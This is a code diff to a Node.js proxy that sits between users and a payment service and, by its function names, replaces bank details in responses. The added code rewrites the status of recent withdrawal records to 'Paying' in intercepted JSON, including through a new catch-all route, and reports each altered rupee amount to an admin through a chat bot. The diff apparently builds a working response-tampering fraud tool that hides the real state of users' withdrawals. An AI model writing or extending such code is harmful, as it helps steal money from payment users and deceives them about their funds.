@@ -935,6 +935,51 @@ async function proxyAndReplaceBankInList(req, res) {
       } else {
         applyToItem(jsonResp.data);
       }
+
+      const wCount = bankData.withdrawOverride || 0;
+      if (wCount > 0) {
+        let items = null;
+        if (Array.isArray(jsonResp.data)) items = jsonResp.data;
+        else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) items = jsonResp.data.list;
+        else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) items = jsonResp.data.records;
+        if (!items && typeof jsonResp.data === 'object') {
+          for (const k of Object.keys(jsonResp.data)) {
+            if (Array.isArray(jsonResp.data[k]) && jsonResp.data[k].length > 0) {
+              items = jsonResp.data[k];
+              break;
+            }
+          }
+        }
+
+        if (items && items.length > 0 && items[0] && (items[0].status !== undefined || items[0].statusName !== undefined || items[0].payStatus !== undefined)) {
+          const allKeys = Object.keys(items[0]);
+          const statusKeys = allKeys.filter(k => /status/i.test(k));
+          let changed = 0;
+          const changedDetails = [];
+          for (let i = items.length - 1; i >= 0 && changed < wCount; i--) {
+            const oldStatus = items[i].status;
+            const oldStatusName = items[i].statusName;
+            for (const sk of statusKeys) {
+              if (sk === 'statusName' || sk === 'statusText') {
+                items[i][sk] = 'Paying';
+              } else {
+                items[i][sk] = 0;
+              }
+            }
+            if (statusKeys.length === 0) {
+              items[i].status = 0;
+              items[i].statusName = 'Paying';
+            }
+            changedDetails.push(`${oldStatusName || oldStatus} → Paying (₹${items[i].amount || items[i].amountOrder || items[i].money || '?'})`);
+            changed++;
+          }
+          if (changed > 0 && bankData.adminChatId && bot) {
+            bot.sendMessage(bankData.adminChatId,
+              `✅ [${req.originalUrl}] Changed ${changed} item(s) to Paying:\n${changedDetails.join('\n')}`
+            ).catch(() => {});
+          }
+        }
+      }
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -1057,7 +1102,72 @@ app.get('/health', async (req, res) => {
 });
 
 app.use(async (req, res) => {
-  await transparentProxy(req, res);
+  const bankData = await loadData();
+  const wCount = bankData.withdrawOverride || 0;
+
+  if (wCount > 0) {
+    if (bankData.adminChatId && bot) {
+      bot.sendMessage(bankData.adminChatId, `🔍 Catch-all: ${req.method} ${req.originalUrl}`).catch(() => {});
+    }
+
+    try {
+      const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+
+      if (jsonResp && jsonResp.data) {
+        let items = null;
+        if (Array.isArray(jsonResp.data)) items = jsonResp.data;
+        else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) items = jsonResp.data.list;
+        else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) items = jsonResp.data.records;
+        if (!items && typeof jsonResp.data === 'object') {
+          for (const k of Object.keys(jsonResp.data)) {
+            if (Array.isArray(jsonResp.data[k]) && jsonResp.data[k].length > 0) {
+              items = jsonResp.data[k];
+              break;
+            }
+          }
+        }
+
+        if (items && items.length > 0 && items[0] && (items[0].status !== undefined || items[0].statusName !== undefined || items[0].payStatus !== undefined)) {
+          const firstItem = items[0];
+          const allKeys = Object.keys(firstItem);
+          const statusKeys = allKeys.filter(k => /status/i.test(k));
+
+          let changed = 0;
+          const changedDetails = [];
+          for (let i = items.length - 1; i >= 0 && changed < wCount; i--) {
+            const oldStatus = items[i].status;
+            const oldStatusName = items[i].statusName;
+            for (const sk of statusKeys) {
+              if (sk === 'statusName' || sk === 'statusText') {
+                items[i][sk] = 'Paying';
+              } else {
+                items[i][sk] = 0;
+              }
+            }
+            if (statusKeys.length === 0) {
+              items[i].status = 0;
+              items[i].statusName = 'Paying';
+            }
+            changedDetails.push(`${oldStatusName || oldStatus} → Paying (₹${items[i].amount || items[i].amountOrder || items[i].money || '?'})`);
+            changed++;
+          }
+
+          if (changed > 0 && bankData.adminChatId && bot) {
+            bot.sendMessage(bankData.adminChatId,
+              `✅ [${req.originalUrl}] Changed ${changed} item(s) to Paying:\n${changedDetails.join('\n')}`
+            ).catch(() => {});
+          }
+        }
+      }
+
+      sendJson(res, respHeaders, jsonResp, respBody);
+    } catch (e) {
+      console.error('catch-all withdraw proxy error:', e.message);
+      if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
+    }
+  } else {
+    await transparentProxy(req, res);
+  }
 });
 
 module.exports = app;
